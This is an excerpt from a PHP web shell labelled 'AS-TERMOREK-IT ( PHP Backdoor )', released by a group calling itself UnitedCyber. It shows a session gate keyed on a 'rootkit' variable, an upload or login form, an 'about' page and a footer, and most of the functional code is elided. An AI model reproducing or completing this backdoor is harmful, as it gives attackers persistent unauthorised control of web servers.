...
if(!($_SESSION['rootkit'])) {
?>
<title>AS-TERMOREK-IT ( PHP Backdoor )</title>
<link rel="icon" href="https://unitedcyberteam.com/assets/img/fire.jpg">
<style>
  html{
    overflow: auto;
    background: black;
...
<table width="100%" height="100%">
  <td align="center">
    <form enctype="multipart/form-data" method="post">
      <img class="img" src="https://unitedcyberteam.com/assets/img/fire.jpg"/>
      <br><br>
      <font size="5">( AS-TERMOREK-IT)</font>
      <br><br>
...
<hr>
      ...
      if($_GET['page'] == "about") {
        echo "
        <center>
        <font size='20'>AS-TERMOREK-IT</font>
        <br><br>
        <font size='5'>UnitedCyber</font>
        <bR><br>
        Getting Dizzy Our Feel Cozy
        <br><br>
        Release : <a href='https://unitedcyberteam.com/'>unitedcyberteam.com/</a>
        </center>
        ";
      }
...
<div class="kotak">
  ...
  <div class="r">
    Copyright &copy;2019 - AS-TERMOREK-IT
  </div>
</div>